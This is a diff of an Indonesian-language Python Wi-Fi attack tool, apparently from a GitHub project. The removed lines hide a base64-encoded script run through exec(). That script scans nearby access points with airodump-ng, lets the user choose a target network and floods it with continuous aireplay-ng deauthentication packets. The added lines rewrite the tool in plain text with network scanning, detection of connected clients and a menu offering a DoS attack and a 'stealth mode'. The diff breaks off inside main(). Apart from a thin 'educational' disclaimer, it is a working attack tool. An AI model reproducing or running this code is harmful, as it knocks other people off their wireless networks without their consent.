@@ -1,11 +1,230 @@
+#!/usr/bin/env python3
+# Disclaimer: This script is for educational purposes only. Do not use against any network that you don't own or have authorization to test.
+import subprocess
+import re
+import csv
+import os
+import time
+from datetime import datetime
+from colorama import Fore, Style, init
+from tabulate import tabulate
 
-# Protected by KaisarYe
-# https://github.com/KaisarYetiandi
-import base64
+# Inisialisasi Colorama untuk tampilan warna
+init(autoreset=True)
 
-# Encrypted code
-ENCRYPTED_CODE = "CiMhL3Vzci9iaW4vZW52IHB5dGhvbjMKIyBEaXNjbGFpbWVyOiBUaGlzIHNjcmlwdCBpcyBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMgb25seS4gIERvIG5vdCB1c2UgYWdhaW5zdCBhbnkgbmV0d29yayB0aGF0IHlvdSBkb24ndCBvd24gb3IgaGF2ZSBhdXRob3JpemF0aW9uIHRvIHRlc3QuCgojIFdlIHdpbGwgYmUgdXNpbmcgdGhlIHN1YnByb2Nlc3MgbW9kdWxlIHRvIHJ1biBjb21tYW5kcyBvbiBLYWxpIExpbnV4LgppbXBvcnQgc3VicHJvY2VzcwojIFdlIHJlcXVpcmUgcmVndWxhciBleHByZXNzaW9ucy4KaW1wb3J0IHJlCiMgV2Ugd2FudCB0byBvcGVuIHRoZSBDU1YgZmlsZXMgZ2VuZXJhdGVkIGJ5IGFpcm1vbi1uZywgCiMgYW5kIHdlJ2xsIHVzZSB0aGUgYnVpbHQtaW4gY3N2IG1vZHVsZS4KaW1wb3J0IGNzdgojIFdlIHdhbnQgdG8gaW1wb3J0IG9zIGJlY2F1c2Ugd2Ugd2FudCB0byBjaGVjayBmb3Igc3VkbwppbXBvcnQgb3MKIyBXZSB3YW50IHRvIHVzZSB0aW1lLnNsZWVwKCkKaW1wb3J0IHRpbWUKIyBXZSB3YW50IHRvIG1vdmUgLmNzdiBmaWxlcyBpbiB0aGUgZm9sZGVyIGlmIHdlIGZvdW5kIGFueS4gCiMgV2UnbGwgdXNlIHNodXRpbCBmb3IgdGhhdC4KaW1wb3J0IHNodXRpbAojIENyZWF0ZSBhIHRpbWVzdGFtcCBmb3IgLmNzdiBmaWxlbmFtZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKIyBDcmVhdGUgYW4gZW1wdHkgbGlzdAphY3RpdmVfd2lyZWxlc3NfbmV0d29ya3MgPSBbXQoKIyBXZSB1c2UgdGhpcyBmdW5jdGlvbiB0byB0ZXN0IGlmIHRoZSBFU1NJRCBpcyBhbHJlYWR5IGluIHRoZSBsaXN0IGZpbGUuIAojIElmIHNvIHdlIHJldHVybiBGYWxzZSBzbyB3ZSBkb24ndCBhZGQgaXQgYWdhaW4uCiMgSWYgaXQgaXMgbm90IGluIHRoZSBsc3Qgd2UgcmV0dXJuIFRydWUgd2hpY2ggd2lsbCBpbnN0cnVjdCB0aGUgZWxpZiAKIyBzdGF0ZW1lbnQgdG8gYWRkIGl0IHRvIHRoZSBsc3QuCmRlZiBjaGVja19mb3JfZXNzaWQoZXNzaWQsIGxzdCk6CiAgICBjaGVja19zdGF0dXMgPSBUcnVlCgogICAgIyBJZiBubyBFU1NJRHMgaW4gbGlzdCBhZGQgdGhlIHJvdwogICAgaWYgbGVuKGxzdCkgPT0gMDoKICAgICAgICByZXR1cm4gY2hlY2tfc3RhdHVzCgogICAgIyBUaGlzIHdpbGwgb25seSBydW4gaWYgdGhlcmUgYXJlIHdpcmVsZXNzIGFjY2VzcyBwb2ludHMgaW4gdGhlIGxpc3QuCiAgICBmb3IgaXRlbSBpbiBsc3Q6CiAgICAgICAgIyBJZiBUcnVlIGRvbid0IGFkZCB0byBsaXN0LiBGYWxzZSB3aWxsIGFkZCBpdCB0byBsaXN0CiAgICAgICAgaWYgZXNzaWQgaW4gaXRlbVsiRVNTSUQiXToKICAgICAgICAgICAgY2hlY2tfc3RhdHVzID0gRmFsc2UKCiAgICByZXR1cm4gY2hlY2tfc3RhdHVzCgojIEJhc2ljIHVzZXIgaW50ZXJmYWNlIGhlYWRlcgpwcmludChyIiIiXyAgXyBfX19fIF8gX19fXyBfX19fIF9fX18gXyAgIF8gX19fXyAKfF8vICB8X198IHwgW19fICB8X198IHxfXy8gIFxfLyAgfF9fXyAKfCBcXyB8ICB8IHwgX19fXSB8ICB8IHwgIFwgICB8ICAgfF9fXwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIikKcHJpbnQoIlxuKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiIpCnByaW50KCJcbiogUGVtYnVhdCBFbXBlcm9yWWUsIDIwMjUgKiIpCnByaW50KCJcbiogSG9iaSBNZW1iYWNhIG5vdmVsICoiKQpwcmludCgiXG4qIFdpZmkgRERvcyBBdHRhY2sgKiIpCnByaW50KCJcbioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioiKQoKCiMgSWYgdGhlIHVzZXIgZG9lc24ndCBydW4gdGhlIHByb2dyYW0gd2l0aCBzdXBlciB1c2VyIHByaXZpbGVnZXMsIGRvbid0IGFsbG93IHRoZW0gdG8gY29udGludWUuCmlmIG5vdCAnU1VET19VSUQnIGluIG9zLmVudmlyb24ua2V5cygpOgogICAgcHJpbnQoIkphbGFua2FuIFByb2dyYW0gaW5pIGRlbmdhbiBwZXJpbnRhaCBzdWRvLiIpCiAgICBleGl0KCkKCiMgUmVtb3ZlIC5jc3YgZmlsZXMgYmVmb3JlIHJ1bm5pbmcgdGhlIHNjcmlwdC4KZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKCk6CiAgICAjIFdlIHNob3VsZCBvbmx5IGhhdmUgb25lIGNzdiBmaWxlIGFzIHdlIGRlbGV0ZSB0aGVtIGZyb20gdGhlIGZvbGRlciAKICAgICMgIGV2ZXJ5IHRpbWUgd2UgcnVuIHRoZSBwcm9ncmFtLgogICAgaWYgIi5jc3YiIGluIGZpbGVfbmFtZToKICAgICAgICBwcmludCgiQWluZyBnYWsgYWthbiBiZXJ0YW5nZ3VuZyBqYXdhYiBqaWthIHRlcmphZGkga2VydXNha2FuIGFwYXB1biBpdHUuIikKICAgICAgICAjIFdlIGdldCB0aGUgY3VycmVudCB3b3JraW5nIGRpcmVjdG9yeS4KICAgICAgICBkaXJlY3RvcnkgPSBvcy5nZXRjd2QoKQogICAgICAgIHRyeToKICAgICAgICAgICAgIyBXZSBtYWtlIGEgbmV3IGRpcmVjdG9yeSBjYWxsZWQgL2JhY2t1cAogICAgICAgICAgICBvcy5ta2RpcihkaXJlY3RvcnkgKyAiL2JhY2t1cC8iKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoIk5PIFNZU1RFTSBJUyBTQUZFLiIpCiAgICAgICAgIyBDcmVhdGUgYSB0aW1lc3RhbXAKICAgICAgICB0aW1lc3RhbXAgPSBkYXRldGltZS5ub3coKQogICAgICAgICMgV2UgbW92ZSBhbnkgLmNzdiBmaWxlcyBpbiB0aGUgZm9sZGVyIHRvIHRoZSBiYWNrdXAgZm9sZGVyLgogICAgICAgIHNodXRpbC5tb3ZlKGZpbGVfbmFtZSwgZGlyZWN0b3J5ICsgIi9iYWNrdXAvIiArIHN0cih0aW1lc3RhbXApICsgIi0iICsgZmlsZV9uYW1lKQoKIyBSZWdleCB0byBmaW5kIHdpcmVsZXNzIGludGVyZmFjZXMuIFdlJ3JlIG1ha2luZyB0aGUgYXNzdW1wdGlvbiB0aGV5IHdpbGwgYWxsIGJlIHdsYW4wIG9yIGhpZ2hlci4Kd2xhbl9wYXR0ZXJuID0gcmUuY29tcGlsZSgiXndsYW5bMC05XSsiKQoKIyBQeXRob24gYWxsb3dzIGlzIHRvIHJ1biBzeXN0ZW0gY29tbWFuZHMgYnkgdXNpbmcgYSBmdW5jdGlvbiBwcm92aWRlZCBieSB0aGUgc3VicHJvY2VzcyBtb2R1bGUuIAojIHN1YnByb2Nlc3MucnVuKDxsaXN0IG9mIGNvbW1hbmQgbGluZSBhcmd1bWVudHMgZ29lcyBoZXJlPikKIyBUaGUgc2NyaXB0IGlzIHRoZSBwYXJlbnQgcHJvY2VzcyBhbmQgY3JlYXRlcyBhIGNoaWxkIHByb2Nlc3Mgd2hpY2ggcnVucyB0aGUgc3lzdGVtIGNvbW1hbmQsIAojIGFuZCB3aWxsIG9ubHkgY29udGludWUgb25jZSB0aGUgY2hpbGQgcHJvY2VzcyBoYXMgY29tcGxldGVkLgojIFdlIHJ1biB0aGUgaXdjb25maWcgY29tbWFuZCB0byBsb29rIGZvciB3aXJlbGVzcyBpbnRlcmZhY2VzLgpjaGVja193aWZpX3Jlc3VsdCA9IHdsYW5fcGF0dGVybi5maW5kYWxsKHN1YnByb2Nlc3MucnVuKFsiaXdjb25maWciXSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkuc3Rkb3V0LmRlY29kZSgpKQoKIyBObyBXaUZpIEFkYXB0ZXIgY29ubmVjdGVkLgppZiBsZW4oY2hlY2tfd2lmaV9yZXN1bHQpID09IDA6CiAgICBwcmludCgiSHVidW5na2FuIFdpZmkgYWRhcHRvciB3aWZpIGx1IGRhbiBjb2JhIGxhZ2kuIikKICAgIGV4aXQoKQoKIyBNZW51IHRvIHNlbGVjdCBXaUZpIGludGVyZmFjZSBmcm9tCnByaW50KCJBbnRhcm11a2Egd2lmaSB0ZXJzZWRpYToiKQpmb3IgaW5kZXgsIGl0ZW0gaW4gZW51bWVyYXRlKGNoZWNrX3dpZmlfcmVzdWx0KToKICAgIHByaW50KGYie2luZGV4fSAtIHtpdGVtfSIpCgojIEVuc3VyZSB0aGUgV2lGaSBpbnRlcmZhY2Ugc2VsZWN0ZWQgaXMgdmFsaWQuIFNpbXBsZSBtZW51IHdpdGggaW50ZXJmYWNlcyB0byBzZWxlY3QgZnJvbS4Kd2hpbGUgVHJ1ZToKICAgIHdpZmlfaW50ZXJmYWNlX2Nob2ljZSA9IGlucHV0KCJTaWxhaGthbiBwaWxpaCBhbnRhcm11a2EgamFyaW5nYW4geWFuZyBpbmdpbiBsdSBndW5ha2FuIHVudHVrIG1lbnllcmFuZyA6ICIpCiAgICB0cnk6CiAgICAgICAgaWYgY2hlY2tfd2lmaV9yZXN1bHRbaW50KHdpZmlfaW50ZXJmYWNlX2Nob2ljZSldOgogICAgICAgICAgICBicmVhawogICAgZXhjZXB0OgogICAgICAgIHByaW50KCJTaWxhaGthbiBtYXN1a2FuIGFuZ2trYSB5YW5nIHNlc3VhIGRlbmdhbiBwaWxpaGFuIHlhbmcgdGVyc2VkaWEuIikKCiMgRm9yIGVhc3kgcmVmZXJlbmNlIHdlIGNhbGwgdGhlIHNlbGVjdGVkIGludGVyZmFjZSBoYWNrbmljCmhhY2tuaWMgPSBjaGVja193aWZpX3Jlc3VsdFtpbnQod2lmaV9pbnRlcmZhY2VfY2hvaWNlKV0KCiMgVGVsbCB0aGUgdXNlciB3ZSdyZSBnb2luZyB0byBraWxsIHRoZSBjb25mbGljdGluZyBwcm9jZXNzZXMuCnByaW50KCJXaUZpIGFkYXB0ZXIgY29ubmVjdGVkIVxuTm93IGxldCdzIGtpbGwgY29uZmxpY3RpbmcgcHJvY2Vzc2VzOiIpCgojIFB1dCB3aXJlbGVzcyBpbiBNb25pdG9yIG1vZGUKcHJpbnQoIlB1dHRpbmcgV2lmaSBhZGFwdGVyIGludG8gbW9uaXRvcmVkIG1vZGU6IikKIyBUaGlzIGlzIG9uZSB3YXkgdG8gcHV0IGl0IGludG8gbW9uaXRvcmluZyBtb2RlLiBZb3UgY2FuIGFsc28gdXNlIGl3Y29uZmlnLCBvciBhaXJtb24tbmcuCnN1YnByb2Nlc3MucnVuKFsiaXAiLCAibGluayIsICJzZXQiLCBoYWNrbmljLCAiZG93biJdKQojIEtpbGxpbmcgYWRkaXRpb25hbCBwcm9jZXNzZXMgbWFrZXMgc3VyZSB0aGF0IG5vdGhpbmcgaW50ZXJmZXJlcyB3aXRoIHB1dHRpbmcgY29udHJvbGxlciBpbnRvIG1vbml0b3IgbW9kZS4Kc3VicHJvY2Vzcy5ydW4oWyJhaXJtb24tbmciLCAiY2hlY2siLCAia2lsbCJdKQojIFB1dCB0aGUgV2lGaSBuaWMgaW4gbW9uaXRvciBtb2RlLgpzdWJwcm9jZXNzLnJ1bihbIml3IiwgaGFja25pYywgInNldCIsICJtb25pdG9yIiwgIm5vbmUiXSkKIyBCcmluZyB0aGUgV2lGaSBjb250cm9sbGVyIGJhY2sgb25saW5lLgpzdWJwcm9jZXNzLnJ1bihbImlwIiwgImxpbmsiLCAic2V0IiwgaGFja25pYywgInVwIl0pCgojIHN1YnByb2Nlc3MuUG9wZW4oPGxpc3Qgb2YgY29tbWFuZCBsaW5lIGFyZ3VtZW50cyBnb2VzIGhlcmU+KQojIFRoZSBQb3BlbiBtZXRob2Qgb3BlbnMgYSBwaXBlIGZyb20gYSBjb21tYW5kLiAKIyBUaGUgb3V0cHV0IGlzIGFuIG9wZW4gZmlsZSB0aGF0IGNhbiBiZSBhY2Nlc3NlZCBieSBvdGhlciBwcm9ncmFtcy4KIyBXZSBydW4gdGhlIGl3Y29uZmlnIGNvbW1hbmQgdG8gbG9vayBmb3Igd2lyZWxlc3MgaW50ZXJmYWNlcy4KIyBEaXNjb3ZlciBhY2Nlc3MgcG9pbnRzCmRpc2NvdmVyX2FjY2Vzc19wb2ludHMgPSBzdWJwcm9jZXNzLlBvcGVuKFsic3VkbyIsICJhaXJvZHVtcC1uZyIsIi13IiAsImZpbGUiLCItLXdyaXRlLWludGVydmFsIiwgIjEiLCItLW91dHB1dC1mb3JtYXQiLCAiY3N2IiwgaGFja25pY10sIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCgojIExvb3AgdGhhdCBzaG93cyB0aGUgd2lyZWxlc3MgYWNjZXNzIHBvaW50cy4gV2UgdXNlIGEgdHJ5IGV4Y2VwdCBibG9jayBhbmQgd2Ugd2lsbCBxdWl0IHRoZSBsb29wIGJ5IHByZXNzaW5nIGN0cmwtYy4KdHJ5OgogICAgd2hpbGUgVHJ1ZToKICAgICAgICAjIFdlIHdhbnQgdG8gY2xlYXIgdGhlIHNjcmVlbiBiZWZvcmUgd2UgcHJpbnQgdGhlIG5ldHdvcmsgaW50ZXJmYWNlcy4KICAgICAgICBzdWJwcm9jZXNzLmNhbGwoImNsZWFyIiwgc2hlbGw9VHJ1ZSkKICAgICAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoKToKICAgICAgICAgICAgICAgICMgV2Ugc2hvdWxkIG9ubHkgaGF2ZSBvbmUgY3N2IGZpbGUgYXMgd2UgYmFja3VwIGFsbCBwcmV2aW91cyBjc3YgZmlsZXMgZnJvbSB0aGUgZm9sZGVyIGV2ZXJ5IHRpbWUgd2UgcnVuIHRoZSBwcm9ncmFtLiAKICAgICAgICAgICAgICAgICMgVGhlIGZvbGxvd2luZyBsaXN0IGNvbnRhaW5zIHRoZSBmaWVsZCBuYW1lcyBmb3IgdGhlIGNzdiBlbnRyaWVzLgogICAgICAgICAgICAgICAgZmllbGRuYW1lcyA9IFsnQlNTSUQnLCAnRmlyc3RfdGltZV9zZWVuJywgJ0xhc3RfdGltZV9zZWVuJywgJ2NoYW5uZWwnLCAnU3BlZWQnLCAnUHJpdmFjeScsICdDaXBoZXInLCAnQXV0aGVudGljYXRpb24nLCAnUG93ZXInLCAnYmVhY29ucycsICdJVicsICdMQU5fSVAnLCAnSURfbGVuZ3RoJywgJ0VTU0lEJywgJ0tleSddCiAgICAgICAgICAgICAgICBpZiAiLmNzdiIgaW4gZmlsZV9uYW1lOgogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX25hbWUpIGFzIGNzdl9oOgogICAgICAgICAgICAgICAgICAgICAgICAjIFRoaXMgd2lsbCBydW4gbXVsdGlwbGUgdGltZXMgYW5kIHdlIG5lZWQgdG8gcmVzZXQgdGhlIGN1cnNvciB0byB0aGUgYmVnaW5uaW5nIG9mIHRoZSBmaWxlLgogICAgICAgICAgICAgICAgICAgICAgICBjc3ZfaC5zZWVrKDApCiAgICAgICAgICAgICAgICAgICAgICAgICMgV2UgdXNlIHRoZSBEaWN0UmVhZGVyIG1ldGhvZCBhbmQgdGVsbCBpdCB0byB0YWtlIHRoZSBjc3ZfaCBjb250ZW50cyBhbmQgdGhlbiBhcHBseSB0aGUgZGljdGlvbmFyeSB3aXRoIHRoZSBmaWVsZG5hbWVzIHdlIHNwZWNpZmllZCBhYm92ZS4gCiAgICAgICAgICAgICAgICAgICAgICAgICMgVGhpcyBjcmVhdGVzIGEgbGlzdCBvZiBkaWN0aW9uYXJpZXMgd2l0aCB0aGUga2V5cyBhcyBzcGVjaWZpZWQgaW4gdGhlIGZpZWxkbmFtZXMuCiAgICAgICAgICAgICAgICAgICAgICAgIGNzdl9yZWFkZXIgPSBjc3YuRGljdFJlYWRlcihjc3ZfaCwgZmllbGRuYW1lcz1maWVsZG5hbWVzKQogICAgICAgICAgICAgICAgICAgICAgICBmb3Igcm93IGluIGNzdl9yZWFkZXI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFdlIHdhbnQgdG8gZXhjbHVkZSB0aGUgcm93IHdpdGggQlNTSUQuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb3dbIkJTU0lEIl0gPT0gIkJTU0lEIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFdlIGFyZSBub3QgaW50ZXJlc3RlZCBpbiB0aGUgY2xpZW50IGRhdGEuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIHJvd1siQlNTSUQiXSA9PSAiU3RhdGlvbiBNQUMiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIEV2ZXJ5IGZpZWxkIHdoZXJlIGFuIEVTU0lEIGlzIHNwZWNpZmllZCB3aWxsIGJlIGFkZGVkIHRvIHRoZSBsaXN0LgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBjaGVja19mb3JfZXNzaWQocm93WyJFU1NJRCJdLCBhY3RpdmVfd2lyZWxlc3NfbmV0d29ya3MpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGl2ZV93aXJlbGVzc19uZXR3b3Jrcy5hcHBlbmQocm93KQoKICAgICAgICBwcmludCgiTWVtaW5kYWkuIFRla2FuIEN0cmwrQyBzYWF0IGx1IGluZ2luIG1lbWlsaWggd2lmaSBtYW5hIHlhbmcgaW5naW4gbHUgc2VyYW5nLlxuIikKICAgICAgICBwcmludCgiTm8gfFx0QlNTSUQgICAgICAgICAgICAgIHxcdENoYW5uZWx8XHRFU1NJRCAgICAgICAgICAgICAgICAgICAgICAgICB8IikKICAgICAgICBwcmludCgiX19ffFx0X19fX19fX19fX19fX19fX19fX3xcdF9fX19fX198XHRfX19fX19fX19fX19fX19fX19fX19fX19fX19fX198IikKICAgICAgICBmb3IgaW5kZXgsIGl0ZW0gaW4gZW51bWVyYXRlKGFjdGl2ZV93aXJlbGVzc19uZXR3b3Jrcyk6CiAgICAgICAgICAgICMgV2UncmUgdXNpbmcgdGhlIHByaW50IHN0YXRlbWVudCB3aXRoIGFuIGYtc3RyaW5nLiAKICAgICAgICAgICAgIyBGLXN0cmluZ3MgYXJlIGEgbW9yZSBpbnR1aXRpdmUgd2F5IHRvIGluY2x1ZGUgdmFyaWFibGVzIHdoZW4gcHJpbnRpbmcgc3RyaW5ncywgCiAgICAgICAgICAgICMgcmF0aGVyIHRoYW4gdWdseSBjb25jYXRlbmF0aW9ucy4KICAgICAgICAgICAgcHJpbnQoZiJ7aW5kZXh9XHR7aXRlbVsnQlNTSUQnXX1cdHtpdGVtWydjaGFubmVsJ10uc3RyaXAoKX1cdFx0e2l0ZW1bJ0VTU0lEJ119IikKICAgICAgICAjIFdlIG1ha2UgdGhlIHNjcmlwdCBzbGVlcCBmb3IgMSBzZWNvbmQgYmVmb3JlIGxvYWRpbmcgdGhlIHVwZGF0ZWQgbGlzdC4KICAgICAgICB0aW1lLnNsZWVwKDEpCgpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBwcmludCgiXG5TaWFwIHVudHVrIG1lbWlsaWguIikKCiMgRW5zdXJlIHRoYXQgdGhlIGlucHV0IGNob2ljZSBpcyB2YWxpZC4Kd2hpbGUgVHJ1ZToKICAgICMgSWYgeW91IGRvbid0IG1ha2UgYSBjaG9pY2UgZnJvbSB0aGUgb3B0aW9ucyBhdmFpbGFibGUgaW4gdGhlIGxpc3QsIAogICAgIyB5b3Ugd2lsbCBiZSBhc2tlZCB0byBwbGVhc2UgdHJ5IGFnYWluLgogICAgY2hvaWNlID0gaW5wdXQoIlBpbGloIHRhcmdldCBsdTogIikKICAgIHRyeToKICAgICAgICBpZiBhY3RpdmVfd2lyZWxlc3NfbmV0d29ya3NbaW50KGNob2ljZSldOgogICAgICAgICAgICBicmVhawogICAgZXhjZXB0OgogICAgICAgIHByaW50KCJQbGVhc2UgdHJ5IGFnYWluLiIpCgojIFRvIG1ha2UgaXQgZWFzaWVyIHRvIHdvcmsgd2l0aCBhbmQgcmVhZCB0aGUgY29kZSwgd2UgYXNzaWduIHRoZSByZXN1bHRzIHRvIHZhcmlhYmxlcy4KaGFja2Jzc2lkID0gYWN0aXZlX3dpcmVsZXNzX25ldHdvcmtzW2ludChjaG9pY2UpXVsiQlNTSUQiXQpoYWNrY2hhbm5lbCA9IGFjdGl2ZV93aXJlbGVzc19uZXR3b3Jrc1tpbnQoY2hvaWNlKV1bImNoYW5uZWwiXS5zdHJpcCgpCgojIENoYW5nZSB0byB0aGUgY2hhbm5lbCB3ZSB3YW50IHRvIHBlcmZvcm0gdGhlIERPUyBhdHRhY2sgb24uIAojIE1vbml0b3JpbmcgdGFrZXMgcGxhY2Ugb24gYSBkaWZmZXJlbnQgY2hhbm5lbCBhbmQgd2UgbmVlZCB0byBzZXQgaXQgdG8gdGhhdCBjaGFubmVsLiAKc3VicHJvY2Vzcy5ydW4oWyJhaXJtb24tbmciLCAic3RhcnQiLCBoYWNrbmljLCBoYWNrY2hhbm5lbF0pCgojIERlYXV0aGVudGljYXRlIGNsaWVudHMgdXNpbmcgYSBzdWJwcm9jZXNzLiAKIyBUaGUgc2NyaXB0IGlzIHRoZSBwYXJlbnQgcHJvY2VzcyBhbmQgY3JlYXRlcyBhIGNoaWxkIHByb2Nlc3Mgd2hpY2ggcnVucyB0aGUgc3lzdGVtIGNvbW1hbmQsIAojIGFuZCB3aWxsIG9ubHkgY29udGludWUgb25jZSB0aGUgY2hpbGQgcHJvY2VzcyBoYXMgY29tcGxldGVkLgp0cnk6CiAgICBzdWJwcm9jZXNzLnJ1bihbImFpcmVwbGF5LW5nIiwgIi0tZGVhdXRoIiwgIjAiLCAiLWEiLCBoYWNrYnNzaWQsIGhhY2tuaWNdKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBwcmludCgiRG9uZSEiKQojIFVzZXIgd2lsbCBuZWVkIHRvIHVzZSBjb250cm9sLWMgdG8gYnJlYWsgdGhlIHNjcmlwdC4K"
+# Banner
+def print_banner():
+    banner = f"""
+{Fore.CYAN}________                __                         
+\\______ \\ _____ _______|  | __ ____   ____   ______
+ |    |  \\__  \\\\_  __ \\  |/ //    \\_/ __ \\ /  ___/
+ |    `   \\/ __ \\|  | \\/    <|   |  \\  ___/ \\___ \\ 
+/_______  (____  /__|  |__|_ \___|  /\___  >____  >
+        \\/     \\/           \\/    \\/     \\/     \/  
+"""
+    creator_info = f"{Fore.GREEN}Created by: KaisarYetiandi\nGitHub: https://github.com/KaisarYetiandi"
+    print(banner)
+    print(creator_info)
+    print("\n" + "=" * 60)
+    print(f"{Fore.YELLOW}Disclaimer: Gunakan tools ini hanya untuk pendidikan.")
+    print("=" * 60)
 
-# Decrypt and execute the code
-decrypted_code = base64.b64decode(ENCRYPTED_CODE.encode('utf-8')).decode('utf-8')
-exec(decrypted_code)
+# Fungsi untuk membersihkan layar
+def clear_screen():
+    subprocess.call("clear", shell=True)
+
+# Fungsi untuk animasi loading spinner
+def loading_spinner(duration=1):
+    spinner = ["-", "\\", "|", "/"]
+    for _ in range(duration * 4):
+        for symbol in spinner:
+            print(f"\r{Fore.YELLOW}[INFO] Memproses... {symbol}", end="")
+            time.sleep(0.25)
+    print("\r", end="")
+
+# Fungsi untuk mendapatkan emotikon berdasarkan kekuatan sinyal
+def get_signal_emote(power):
+    power = int(power)
+    if power >= -50:
+        return "⚡"  # Sinyal sangat kuat
+    elif -50 > power >= -70:
+        return "📡"  # Sinyal kuat
+    else:
+        return "⚠️"  # Sinyal lemah
+
+# Fungsi untuk memindai jaringan Wi-Fi
+def scan_wireless_networks(hacknic):
+    active_wireless_networks = []
+    fieldnames = [
+        "BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed",
+        "Privacy", "Cipher", "Authentication", "Power", "beacons", "IV",
+        "LAN_IP", "ID_length", "ESSID", "Key"
+    ]
+    discover_access_points = subprocess.Popen(
+        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+    try:
+        while True:
+            clear_screen()
+            for file_name in os.listdir():
+                if ".csv" in file_name:
+                    with open(file_name) as csv_h:
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for row in csv_reader:
+                            if row["BSSID"] == "BSSID":
+                                continue
+                            elif row["BSSID"] == "Station MAC":
+                                break
+                            elif row["ESSID"] not in [item["ESSID"] for item in active_wireless_networks]:
+                                active_wireless_networks.append(row)
+            # Urutkan jaringan berdasarkan kekuatan sinyal (dBm)
+            active_wireless_networks.sort(key=lambda x: int(x["Power"]), reverse=True)
+
+            # Tampilkan hasil dalam tabel modern
+            table_data = []
+            for index, item in enumerate(active_wireless_networks):
+                signal_emote = get_signal_emote(item["Power"])
+                privacy_emote = "🔒" if "WPA" in item["Privacy"] or "WEP" in item["Privacy"] else "🔓"
+                table_data.append([
+                    index,
+                    item["BSSID"],
+                    item["channel"].strip(),
+                    item["ESSID"],
+                    f"{item['Power']} dBm {signal_emote}",
+                    f"{item['Privacy']} {privacy_emote}"
+                ])
+            headers = ["No", "BSSID", "Channel", "ESSID", "Signal Strength", "Security"]
+            print(f"{Fore.YELLOW}Memindai jaringan Wi-Fi... Tekan Ctrl+C untuk memilih target.\n")
+            print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))
+            time.sleep(1)  # Delay untuk memperbarui tabel
+    except KeyboardInterrupt:
+        discover_access_points.terminate()
+        print(f"\n{Fore.GREEN}[INFO] Siap untuk memilih target.")
+    return active_wireless_networks
+
+# Fungsi untuk mendeteksi perangkat yang terhubung ke jaringan
+def detect_connected_clients(hacknic, target_bssid):
+    connected_clients = []
+    client_fieldnames = ["Station MAC", "First_time_seen", "Last_time_seen", "Power", "Packets", "BSSID", "Probed ESSIDs"]
+    subprocess.run(["sudo", "airodump-ng", "--bssid", target_bssid, "-c", "1", "-w", "clients", "--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    for file_name in os.listdir():
+        if "clients.csv" in file_name:
+            with open(file_name) as csv_h:
+                csv_h.seek(0)
+                csv_reader = csv.DictReader(csv_h, fieldnames=client_fieldnames)
+                for row in csv_reader:
+                    if row["Station MAC"] == "Station MAC":
+                        continue
+                    elif row["Station MAC"]:
+                        connected_clients.append(row)
+    return connected_clients
+
+# Fungsi untuk menampilkan perangkat terhubung
+def display_connected_clients(clients):
+    table_data = []
+    for index, client in enumerate(clients):
+        table_data.append([
+            index,
+            client["Station MAC"],
+            client["Packets"],
+            client["Power"] + " dBm",
+            client["Probed ESSIDs"]
+        ])
+    headers = ["No", "Client MAC", "Packets", "Signal Strength", "Probed ESSIDs"]
+    print(f"{Fore.YELLOW}Perangkat yang terhubung ke jaringan:\n")
+    print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))
+
+# Fungsi untuk analisis keamanan jaringan
+def analyze_network_security(network):
+    security = network["Privacy"]
+    if "WEP" in security:
+        return f"{Fore.RED}[WARNING] Jaringan ini menggunakan WEP (Tidak Aman)."
+    elif "WPA" in security:
+        return f"{Fore.YELLOW}[INFO] Jaringan ini menggunakan WPA/WPA2 (Aman)."
+    else:
+        return f"{Fore.GREEN}[INFO] Jaringan ini terbuka (Tidak Aman)."
+
+# Menu utama
+def main_menu():
+    print_banner()
+    print(f"{Fore.CYAN}=== Menu Utama ===")
+    print(f"{Fore.YELLOW}1. Pemindaian Jaringan Wi-Fi")
+    print(f"{Fore.YELLOW}2. Deteksi Perangkat Terhubung")
+    print(f"{Fore.YELLOW}3. Analisis Keamanan Jaringan")
+    print(f"{Fore.YELLOW}4. Serangan DOS")
+    print(f"{Fore.YELLOW}5. Mode Stealth")
+    print(f"{Fore.YELLOW}6. Log Aktivitas")
+    print(f"{Fore.YELLOW}7. Keluar")
+    choice = input(f"{Fore.YELLOW}Pilih opsi (1-7): ")
+    return choice
+
+# Fungsi utama
+def main():
+    print_banner()
+
+    # Pastikan program dijalankan sebagai root
+    if not 'SUDO_UID' in os.environ.keys():
+        print(f"{Fore.RED}[ERROR] Jalankan program ini dengan sudo.")
+        exit()
+
+    # Temukan antarmuka Wi-Fi yang tersedia
